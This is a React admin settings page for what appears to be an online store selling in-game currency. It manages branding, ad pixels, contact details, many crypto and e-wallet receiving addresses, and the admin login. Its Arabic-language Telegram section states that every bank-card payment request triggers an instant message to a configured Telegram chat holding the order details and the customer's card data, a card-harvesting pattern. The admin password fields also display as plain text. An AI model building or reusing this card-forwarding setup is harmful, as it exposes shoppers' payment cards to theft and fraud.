'use client'

import { useEffect, useState } from 'react'
import { toast } from 'sonner'
import { Loader2, Save, Rocket, Phone, Share2, LifeBuoy, Coins, UserRound, KeyRound, Send, CheckCircle2, Eye, EyeOff, Target } from 'lucide-react'
import { Skeleton } from '@/components/ui/skeleton'
import type { SiteSettings } from '@/lib/settings'

type Draft = Partial<Record<keyof SiteSettings, string | boolean>>

export function SettingsClient() {
  const [loading, setLoading] = useState(true)
  const [saving, setSaving] = useState(false)
  const [draft, setDraft] = useState<Draft>({})

  // Account (username / password)
  const [username, setUsername] = useState('')
  const [curPass, setCurPass] = useState('')
  const [newPass, setNewPass] = useState('')
  const [confirmPass, setConfirmPass] = useState('')
  const [accSaving, setAccSaving] = useState(false)
  const [tgTesting, setTgTesting] = useState(false)
  const [tgTestOk, setTgTestOk] = useState<boolean | null>(null)
  const [showToken, setShowToken] = useState(false)

  useEffect(() => {
    fetch('/api/admin/account')
      .then((r) => r.json())
      .then((d) => { if (d.username) setUsername(d.username) })
      .catch(() => {})

    fetch('/api/admin/settings')
      .then((r) => r.json())
      .then((data) => {
        const s: SiteSettings = data.settings
        setDraft({
          siteName: s.siteName, logo: s.logo, freeGift: s.freeGift,
          announcementAr: s.announcementAr, announcementEn: s.announcementEn,
          announcementFr: s.announcementFr, announcementEs: s.announcementEs,
          maintenance: s.maintenance,
          supportEmail: s.supportEmail, phone: s.phone, address: s.address, hours: s.hours, whatsapp: s.whatsapp,
          telegram: s.telegram, discord: s.discord,
          instagram: s.instagram, facebook: s.facebook, twitter: s.twitter, youtube: s.youtube, tiktok: s.tiktok,
          facebookPixelId: s.facebookPixelId,
          googleAdsPixelId: s.googleAdsPixelId, tiktokPixelId: s.tiktokPixelId, snapchatPixelId: s.snapchatPixelId,
          walletTrc20: s.walletTrc20, walletBep20: s.walletBep20, binancePayId: s.binancePayId,
          walletBtc: s.walletBtc, walletEth: s.walletEth, walletBnb: s.walletBnb, walletUsdc: s.walletUsdc,
          walletSol: s.walletSol,
          paymentWise: s.paymentWise, paymentPayoneer: s.paymentPayoneer, paymentSkrill: s.paymentSkrill,
          paymentNeteller: s.paymentNeteller, paymentRedotpay: s.paymentRedotpay, paymentBybit: s.paymentBybit,
          paymentRevolut: s.paymentRevolut,
          telegramBotToken: s.telegramBotToken,
          telegramChatId: s.telegramChatId,
        })
      })
      .catch(() => toast.error('Failed to load settings'))
      .finally(() => setLoading(false))
  }, [])

  const set = (key: keyof SiteSettings, value: string | boolean) => setDraft((d) => ({ ...d, [key]: value }))

  async function testTelegram() {
    const token  = str(draft.telegramBotToken).trim()
    const chatId = str(draft.telegramChatId).trim()
    if (!token || !chatId) return toast.error('أدخل Bot Token و Chat ID أولاً')
    setTgTesting(true)
    setTgTestOk(null)
    try {
      const res = await fetch('/api/admin/telegram-test', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token, chatId }),
      })
      const data = await res.json()
      if (!res.ok || !data.ok) throw new Error(data.error || 'فشل الإرسال')
      setTgTestOk(true)
      toast.success('✅ تم إرسال رسالة الاختبار بنجاح!')
    } catch (e) {
      setTgTestOk(false)
      toast.error(e instanceof Error ? e.message : 'فشل إرسال الرسالة')
    } finally {
      setTgTesting(false)
    }
  }

  async function saveAccount() {
    if (newPass && newPass !== confirmPass) return toast.error('New passwords do not match')
    if (!curPass) return toast.error('Enter your current password')
    if (!username.trim()) return toast.error('Username cannot be empty')
    setAccSaving(true)
    try {
      const res = await fetch('/api/admin/account', {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          currentPassword: curPass,
          newUsername: username.trim(),
          ...(newPass ? { newPassword: newPass } : {}),
        }),
      })
      const data = await res.json()
      if (!res.ok) throw new Error(data.error || 'Update failed')
      toast.success('Account updated')
      setCurPass(''); setNewPass(''); setConfirmPass('')
    } catch (e) {
      toast.error(e instanceof Error ? e.message : 'Update failed')
    } finally {
      setAccSaving(false)
    }
  }

  async function save() {
    setSaving(true)
    try {
      const res = await fetch('/api/admin/settings', {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(draft),
      })
      const data = await res.json()
      if (!res.ok) throw new Error(data.error || 'Save failed')
      toast.success('Settings saved')
    } catch (e) {
      toast.error(e instanceof Error ? e.message : 'Save failed')
    } finally {
      setSaving(false)
    }
  }

  if (loading) {
    return (
      <div className="space-y-6">
        <div>
          <h1 className="text-2xl font-extrabold">Site Settings</h1>
          <p className="text-sm text-muted-foreground">Manage your site name, logo, contact info and social accounts</p>
        </div>
        <div className="space-y-3">
          {Array.from({ length: 6 }).map((_, i) => <Skeleton key={i} className="h-24 rounded-2xl" />)}
        </div>
      </div>
    )
  }

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-extrabold">Site Settings</h1>
          <p className="text-sm text-muted-foreground">Manage your site name, logo, contact info and social accounts</p>
        </div>
        <button
          onClick={save}
          disabled={saving}
          className="btn-shimmer glow-primary flex items-center gap-2 rounded-xl px-4 py-2.5 text-sm font-semibold text-white disabled:opacity-60"
        >
          {saving ? <Loader2 className="h-4 w-4 animate-spin" /> : <Save className="h-4 w-4" />}
          {saving ? 'Saving…' : 'Save Settings'}
        </button>
      </div>

      <Section icon={<Rocket className="h-4 w-4 text-sky-300" />} title="Brand & Announcements">
        <div className="grid gap-3 sm:grid-cols-2">
          <Text label="Site Name" value={str(draft.siteName)} onChange={(v) => set('siteName', v)} />
          <Text label="Logo Image URL" value={str(draft.logo)} onChange={(v) => set('logo', v)} placeholder="https://…/logo.png" />
          <div className="col-span-full">
            <Text label="Free Gift With Every Purchase (shown on all packages)" value={str(draft.freeGift)} onChange={(v) => set('freeGift', v)} placeholder="e.g. Free in-game booster + 10% extra diamonds" />
          </div>
          <div className="col-span-full">
            <Text label="Announcement Banner — Arabic (shown at the top of the home page)" value={str(draft.announcementAr)} onChange={(v) => set('announcementAr', v)} />
          </div>
          <div className="col-span-full">
            <Text label="Announcement Banner — English" value={str(draft.announcementEn)} onChange={(v) => set('announcementEn', v)} />
          </div>
          <div className="col-span-full">
            <Text label="Announcement Banner — French" value={str(draft.announcementFr)} onChange={(v) => set('announcementFr', v)} />
          </div>
          <div className="col-span-full">
            <Text label="Announcement Banner — Spanish" value={str(draft.announcementEs)} onChange={(v) => set('announcementEs', v)} />
          </div>
          <Toggle label="Maintenance mode" checked={bool(draft.maintenance)} onChange={(v) => set('maintenance', v)} />
        </div>
      </Section>

      <Section icon={<Target className="h-4 w-4 text-violet-400" />} title="Advertising Pixels (Facebook / Google / TikTok / Snapchat)">
        <p className="mb-4 text-xs text-muted-foreground">
          Paste your advertising pixel IDs below. Each one loads automatically on every page of the store and fires
          page views. Leave a field empty to turn that tracker off.
        </p>
        <div className="grid gap-3 sm:grid-cols-2">
          <Text label="Facebook Pixel ID" value={str(draft.facebookPixelId)} onChange={(v) => set('facebookPixelId', v)} placeholder="e.g. 123456789012345" mono />
          <Text label="Google Ads ID (gtag)" value={str(draft.googleAdsPixelId)} onChange={(v) => set('googleAdsPixelId', v)} placeholder="e.g. AW-123456789" mono />
          <Text label="TikTok Ads Pixel ID" value={str(draft.tiktokPixelId)} onChange={(v) => set('tiktokPixelId', v)} placeholder="e.g. CXXXXXXXXXXXXXXX" mono />
          <Text label="Snapchat Ads Pixel ID" value={str(draft.snapchatPixelId)} onChange={(v) => set('snapchatPixelId', v)} placeholder="e.g. abcdef12-3456-7890-abcd-ef1234567890" mono />
        </div>
      </Section>

      <Section icon={<Phone className="h-4 w-4 text-primary" />} title="Contact Info">
        <div className="grid gap-3 sm:grid-cols-2">
          <Text label="Support Email" value={str(draft.supportEmail)} onChange={(v) => set('supportEmail', v)} />
          <Text label="Phone" value={str(draft.phone)} onChange={(v) => set('phone', v)} />
          <div className="col-span-full">
            <Text label="Address" value={str(draft.address)} onChange={(v) => set('address', v)} />
          </div>
          <Text label="Business Hours" value={str(draft.hours)} onChange={(v) => set('hours', v)} />
          <Text label="WhatsApp Number" value={str(draft.whatsapp)} onChange={(v) => set('whatsapp', v)} placeholder="+1 234 567 890" />
        </div>
      </Section>

      <Section icon={<LifeBuoy className="h-4 w-4 text-emerald-400" />} title="Support Channels">
        <div className="grid gap-3 sm:grid-cols-2">
          <Text label="Telegram handle (e.g. ff_support)" value={str(draft.telegram)} onChange={(v) => set('telegram', v)} placeholder="ff_support" />
          <Text label="Discord invite URL" value={str(draft.discord)} onChange={(v) => set('discord', v)} placeholder="https://discord.gg/…" />
        </div>
      </Section>

      {/* ── إشعارات تيليجرام لفريق دعم البطاقة ───────────────────────── */}
      <Section icon={<Send className="h-4 w-4 text-violet-400" />} title="إشعارات تيليجرام — فريق دعم الدفع">
        <p className="mb-4 text-xs text-muted-foreground">
          عند إرسال أي طلب دفع بالبطاقة البنكية، يُرسَل إشعار فوري يحتوي على تفاصيل الطلب وبيانات البطاقة إلى هذا الحساب/المجموعة.
          احصل على <strong>Bot Token</strong> من @BotFather وعلى <strong>Chat ID</strong> بإضافة البوت للمجموعة ثم استخدام @userinfobot.
        </p>
        <div className="grid gap-4 sm:grid-cols-2">
          {/* Bot Token مع إظهار/إخفاء */}
          <div className="col-span-full">
            <label className="mb-1.5 block text-xs font-medium text-muted-foreground">
              Bot Token <span className="text-rose-400">*</span>
            </label>
            <div className="relative">
              <input
                value={str(draft.telegramBotToken)}
                onChange={(e) => { set('telegramBotToken', e.target.value); setTgTestOk(null) }}
                placeholder="123456789:AAEp9W2J1RR8bF…"
                type={showToken ? 'text' : 'password'}
                translate="no"
                className="input-base font-mono text-xs pe-10"
                dir="ltr"
              />
              <button
                type="button"
                onMouseDown={() => setShowToken(true)}
                onMouseUp={() => setShowToken(false)}
                onMouseLeave={() => setShowToken(false)}
                className="absolute inset-y-0 end-3 flex items-center text-muted-foreground hover:text-foreground"
                tabIndex={-1}
              >
                {showToken ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
              </button>
            </div>
          </div>

          {/* Chat ID */}
          <div>
            <label className="mb-1.5 block text-xs font-medium text-muted-foreground">
              Chat ID <span className="text-rose-400">*</span>
              <span className="ml-2 text-muted-foreground/60">(مثال: -1001234567890 للمجموعات)</span>
            </label>
            <input
              value={str(draft.telegramChatId)}
              onChange={(e) => { set('telegramChatId', e.target.value); setTgTestOk(null) }}
              placeholder="-1001234567890"
              translate="no"
              className="input-base font-mono text-xs"
              dir="ltr"
            />
          </div>

          {/* زر الاختبار */}
          <div className="flex items-end">
            <button
              type="button"
              onClick={testTelegram}
              disabled={tgTesting}
              className="flex items-center gap-2 rounded-xl border border-violet-500/40 bg-violet-500/10 px-4 py-2.5 text-sm font-semibold text-violet-300 transition hover:bg-violet-500/20 disabled:opacity-60"
            >
              {tgTesting ? (
                <Loader2 className="h-4 w-4 animate-spin" />
              ) : tgTestOk === true ? (
                <CheckCircle2 className="h-4 w-4 text-emerald-400" />
              ) : (
                <Send className="h-4 w-4" />
              )}
              {tgTesting ? 'جارٍ الإرسال…' : 'إرسال رسالة اختبار'}
            </button>
          </div>
        </div>

        {/* حالة الاختبار */}
        {tgTestOk === true && (
          <div className="mt-3 flex items-center gap-2 rounded-lg border border-emerald-500/30 bg-emerald-500/10 px-4 py-2.5 text-sm text-emerald-300">
            <CheckCircle2 className="h-4 w-4 shrink-0" />
            تم الإرسال بنجاح — تحقق من مجموعة التيليجرام
          </div>
        )}
        {tgTestOk === false && (
          <div className="mt-3 flex items-center gap-2 rounded-lg border border-rose-500/30 bg-rose-500/10 px-4 py-2.5 text-sm text-rose-300">
            <span className="shrink-0 text-base">⚠️</span>
            فشل الإرسال — تأكد من صحة Bot Token وأن البوت مضاف للمجموعة
          </div>
        )}
      </Section>

      <Section icon={<Share2 className="h-4 w-4 text-pink-400" />} title="Social Media Accounts">
        <div className="grid gap-3 sm:grid-cols-2">
          <Text label="Instagram" value={str(draft.instagram)} onChange={(v) => set('instagram', v)} placeholder="https://instagram.com/…" />
          <Text label="Facebook" value={str(draft.facebook)} onChange={(v) => set('facebook', v)} placeholder="https://facebook.com/…" />
          <Text label="Twitter / X" value={str(draft.twitter)} onChange={(v) => set('twitter', v)} placeholder="https://x.com/…" />
          <Text label="YouTube" value={str(draft.youtube)} onChange={(v) => set('youtube', v)} placeholder="https://youtube.com/…" />
          <Text label="TikTok" value={str(draft.tiktok)} onChange={(v) => set('tiktok', v)} placeholder="https://tiktok.com/…" />
        </div>
      </Section>

      <Section icon={<Coins className="h-4 w-4 text-gold" />} title="Wallet & Payment Addresses">
        <p className="mb-3 text-xs text-muted-foreground">
          Used as the receiving address for crypto and e-wallets. Leave blank to keep a method hidden or rely on the Payment Methods page.
        </p>
        <div className="grid gap-3 sm:grid-cols-2">
          <Text label="USDT (TRC20)" value={str(draft.walletTrc20)} onChange={(v) => set('walletTrc20', v)} mono />
          <Text label="USDT (BEP20)" value={str(draft.walletBep20)} onChange={(v) => set('walletBep20', v)} mono />
          <Text label="Binance Pay ID" value={str(draft.binancePayId)} onChange={(v) => set('binancePayId', v)} mono />
          <Text label="BTC" value={str(draft.walletBtc)} onChange={(v) => set('walletBtc', v)} mono />
          <Text label="ETH" value={str(draft.walletEth)} onChange={(v) => set('walletEth', v)} mono />
          <Text label="BNB" value={str(draft.walletBnb)} onChange={(v) => set('walletBnb', v)} mono />
          <Text label="USDC" value={str(draft.walletUsdc)} onChange={(v) => set('walletUsdc', v)} mono />
          <Text label="SOL (Solana)" value={str(draft.walletSol)} onChange={(v) => set('walletSol', v)} mono />
          <Text label="Wise" value={str(draft.paymentWise)} onChange={(v) => set('paymentWise', v)} mono />
          <Text label="Payoneer" value={str(draft.paymentPayoneer)} onChange={(v) => set('paymentPayoneer', v)} mono />
          <Text label="Skrill" value={str(draft.paymentSkrill)} onChange={(v) => set('paymentSkrill', v)} mono />
          <Text label="Neteller" value={str(draft.paymentNeteller)} onChange={(v) => set('paymentNeteller', v)} mono />
          <Text label="RedotPay" value={str(draft.paymentRedotpay)} onChange={(v) => set('paymentRedotpay', v)} mono />
          <Text label="Bybit" value={str(draft.paymentBybit)} onChange={(v) => set('paymentBybit', v)} mono />
          <Text label="Revolut" value={str(draft.paymentRevolut)} onChange={(v) => set('paymentRevolut', v)} mono />
        </div>
      </Section>

      <Section icon={<UserRound className="h-4 w-4 text-sky-300" />} title="Login Account">
        <p className="mb-4 text-xs text-muted-foreground">
          Change the admin username and/or password used to sign in to this dashboard. Enter your current password to confirm.
        </p>
        <div className="grid gap-3 sm:grid-cols-2">
          <Text label="Username" value={username} onChange={setUsername} placeholder="admin" />
          <Text label="Current Password" value={curPass} onChange={setCurPass} placeholder="••••••••" />
          <Text label="New Password (leave blank to keep current)" value={newPass} onChange={setNewPass} placeholder="Minimum 6 characters" />
          <Text label="Confirm New Password" value={confirmPass} onChange={setConfirmPass} placeholder="Repeat new password" />
        </div>
        <button
          onClick={saveAccount}
          disabled={accSaving}
          className="btn-shimmer glow-primary mt-5 flex items-center gap-2 rounded-xl px-4 py-2.5 text-sm font-semibold text-white disabled:opacity-60"
        >
          {accSaving ? <Loader2 className="h-4 w-4 animate-spin" /> : <KeyRound className="h-4 w-4" />}
          {accSaving ? 'Saving…' : 'Update Username / Password'}
        </button>
      </Section>
    </div>
  )
}

function str(v: unknown): string {
  return typeof v === 'string' ? v : ''
}
function bool(v: unknown): boolean {
  return typeof v === 'boolean' ? v : false
}

function Section({ icon, title, children }: { icon: React.ReactNode; title: string; children: React.ReactNode }) {
  return (
    <div className="glass rounded-2xl border border-border p-5">
      <div className="mb-4 flex items-center gap-2">
        <span className="grid h-8 w-8 place-items-center rounded-lg bg-secondary">{icon}</span>
        <h3 className="font-bold">{title}</h3>
      </div>
      {children}
    </div>
  )
}

function Text({ label, value, onChange, placeholder, mono }: { label: string; value: string; onChange: (v: string) => void; placeholder?: string; mono?: boolean }) {
  return (
    <div>
      <label className="mb-1.5 block text-xs font-medium text-muted-foreground">{label}</label>
      <input
        value={value}
        onChange={(e) => onChange(e.target.value)}
        placeholder={placeholder}
        translate="no"
        className={mono ? 'input-base font-mono text-xs' : 'input-base'}
      />
    </div>
  )
}

function Toggle({ label, checked, onChange }: { label: string; checked: boolean; onChange: (v: boolean) => void }) {
  return (
    <button type="button" onClick={() => onChange(!checked)} className="flex items-center justify-between rounded-lg border px-3 py-2.5 text-xs font-medium">
      <span>{label}</span>
      <span className={`h-4 w-8 rounded-full p-0.5 transition-colors ${checked ? 'bg-primary' : 'bg-secondary'}`}>
        <span className={`block h-3 w-3 rounded-full bg-white transition-transform ${checked ? 'translate-x-4' : ''}`} />
      </span>
    </button>
  )
}
